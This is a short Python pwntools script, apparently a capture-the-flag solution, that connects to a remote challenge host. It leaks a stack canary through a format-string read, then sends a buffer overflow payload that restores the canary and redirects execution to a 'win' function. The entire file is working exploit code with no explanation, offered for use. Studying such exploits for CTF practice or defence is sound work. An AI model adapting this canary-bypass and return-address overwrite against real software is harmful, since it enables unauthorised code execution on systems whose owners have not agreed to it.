from pwn import *

io = remote("challs.pwnoh.io", 13403)

win = 0x4011d6
ret = 0x40101a

# canary is at %13$p
io.sendline(b"%13$p")
io.recvline()
canary = int(io.recvline()[:-1], 16)

payload = b"A"*0x28 + p64(canary) + b"A"*8 + p64(ret) + p64(win)

io.sendline(payload)

io.interactive()

